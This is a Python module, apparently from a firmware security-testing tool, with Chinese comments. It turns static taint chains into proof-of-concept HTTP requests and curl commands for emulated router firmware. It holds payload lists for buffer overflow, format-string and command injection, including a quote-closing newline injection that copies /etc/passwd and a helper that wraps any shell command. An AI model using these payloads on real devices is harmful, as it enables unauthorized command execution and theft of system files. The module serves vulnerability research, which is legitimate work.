"""把一条静态链翻译成可执行的 PoC。

静态分析给的是「源 → 汇」这条边，PoC 要回答的是三个具体问题：

1. **打哪个 URL** —— 从 M2 的端点表反查这个函数对应的路由；
2. **塞哪个参数** —— `source_param`（如 `websGetVar("wan_ip")` 里的 `wan_ip`）；
3. **塞什么** —— 按汇的类别选载荷：
     `bof` 超长串（从短到长多档，找崩溃阈值）
     `cmd` 命令注入（`;id;` 之类，能回显就说明真的执行了）
     `fmt` 格式化串（`%08x.` 连发，看栈上漏没漏数据）

生成出来的东西是**纯文本请求**，能直接喂给 `dyn` 跑，也能复制到 curl 里手工打。
"""

from __future__ import annotations

import urllib.parse

# 载荷按「由轻到重」排序：先试小的，崩了才加码，避免一上来就把服务打挂。
# 类别名跟词表（fwmap/data/taint.txt）里的保持一致：bof / ci（命令注入）/ fmt
#
# ci 里为什么有换行载荷：固件里命令常常是
#     sprintf(cmd, "echo '%s' > /tmp/x", param);  system(cmd);
# 值被包在**单引号**里，而且不少实现会先 `while (*p != ';') p++; *p = 0;`
# 在第一个分号处截断 —— 所以 `;id;` 这类经典载荷打不进去。
# 真正有效的是「单引号闭合 + 换行」：换行不被截断，闭合引号后就能起新命令。
PAYLOADS: dict[str, list[str]] = {
    "bof": ["A" * 64, "A" * 200, "A" * 512, "A" * 1024, "A" * 2048],
    "ci": [";id;", "`id`", "$(id)", "|id",
           "'\nid\n'", "\nid\n", "'\ncp /etc/passwd /tmp/pwned\n'"],
    "cmd": [";id;", "`id`", "$(id)", "|id",
            "'\nid\n'", "\nid\n", "'\ncp /etc/passwd /tmp/pwned\n'"],
    "fmt": ["%08x." * 8, "%08x." * 32, "%s%s%s%s" * 8],
}
DEFAULT_PAYLOAD = ["A" * 512, ";id;"]


def payloads(sink_category: str) -> list[str]:
    return PAYLOADS.get((sink_category or "").lower(), DEFAULT_PAYLOAD)


def guess_path(function: str, uri: str = "") -> str:
    """优先用 M2 抓到的真实 URI；没有就按固件常见约定拼一个。"""
    if uri:
        return uri if uri.startswith("/") else "/" + uri
    return f"/goform/{function}"


def guess_param(chain: dict) -> str:
    """参数名：先用 source_param；没有就按常见的 "cmd"/"input" 兜底。"""
    p = (chain.get("source_param") or "").strip()
    if p:
        return p
    args = chain.get("sink_args") or ""
    m = None
    for name in ("cmd", "input", "ip", "name"):
        if name in args:
            m = name
            break
    return m or "input"


def shell_payloads(cmd: str) -> list[str]:
    """把一条任意 shell 命令包成几种能突破常见包装的形态。

    固件里命令常写成 `sprintf(buf, "echo '%s' > /tmp/x", param)` —— 值被单引号
    包住，很多实现还会在第一个 `;` 处截断。所以 `;id;` 打不进去，
    真正有效的是「单引号闭合 + 换行」。实测 Edimax BR-6478AC 就是这样打通的。
    """
    return [
        f"x'\n{cmd}\n'",      # 闭引号 + 换行：最通用
        f"x'\n{cmd}\n",       # 有的实现最后没有收尾引号
        f"{cmd}",             # 无包装的情况
        f";{cmd};",           # 经典（会被分号截断的实现无效）
    ]


def build_requests(chain: dict, endpoint: dict | None = None,
                   port: int = 8080, host: str = "127.0.0.1",
                   cmd: str | None = None) -> list[dict]:
    """为一条链生成一组候选请求（每个载荷一条）。

    `cmd` 只对命令注入类有意义：给了就用它替换通用载荷，
    这样工具不再只是「打一发 id」，而是真的执行指定命令。
    """
    fn = chain.get("function") or "unknown"
    uri = (endpoint or {}).get("uri") or ""
    path = guess_path(fn, uri)
    param = guess_param(chain)
    cat = (chain.get("sink_category") or "").lower()
    values = shell_payloads(cmd) if (cmd and cat in ("ci", "cmd")) else payloads(cat)
    out = []
    for value in values:
        body = urllib.parse.urlencode({param: value})
        out.append({
            "function": fn,
            "sink": chain.get("sink"),
            "sink_category": cat,
            "param": param,
            "value": value,
            "path": path,
            "method": "POST",
            "host": host,
            "port": port,
            "headers": {"Host": f"{host}:{port}",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Content-Length": str(len(body)),
                        "Connection": "close"},
            "body": body,
            "desc": f"{param} 塞 {len(value)} 字节 "
                    f"{'命令注入' if cat in ('ci', 'cmd') else '数据'}",
        })
    return out


def control_request(port: int = 80, host: str = "127.0.0.1") -> dict:
    """对照组请求：一个绝对无害的 GET /。

    为什么必须有它：固件在模拟器里常常因为缺 NVRAM、缺 /dev、缺配置而**一请求就崩**。
    如果不先打一发无害请求做对照，那种崩溃会被当成「我们打出了漏洞」——
    这是动态验证最容易出的假阳性，也是最难向别人解释的那种。
    """
    return {"function": "<control>", "sink": "", "sink_category": "",
            "param": "", "value": "", "path": "/", "method": "GET",
            "host": host, "port": port,
            "headers": {"Host": host, "Connection": "close"},
            "body": "", "desc": "对照组：无害请求"}


def render_http(req: dict) -> bytes:
    """渲染成可以直接 write 到 socket 的字节串。"""
    lines = [f"{req['method']} {req['path']} HTTP/1.1"]
    lines += [f"{k}: {v}" for k, v in req["headers"].items()]
    head = "\r\n".join(lines) + "\r\n\r\n"
    return head.encode("utf-8") + (req.get("body") or "").encode("utf-8")


def render_curl(req: dict) -> str:
    hdrs = " ".join(f'-H "{k}: {v}"' for k, v in req["headers"].items()
                    if k.lower() != "content-length")
    q = urllib.parse.quote(req.get("value") or "")
    return (f'curl -sS -X {req["method"]} "http://{req["host"]}:{req["port"]}{req["path"]}" '
            f'{hdrs} --data "{req["param"]}={q}"')


def render_markdown(reqs: list[dict], chain: dict) -> str:
    L = [f"## `{chain.get('function')}`  {chain.get('source_api')}({chain.get('source_param')}) "
         f"→ {chain.get('sink')}[{chain.get('sink_category')}]", ""]
    for r in reqs:
        L.append(f"- {r['method']} `{r['path']}` · {r['desc']}")
        L.append(f"  - curl：`{render_curl(r)}`")
    return "\n".join(L) + "\n"
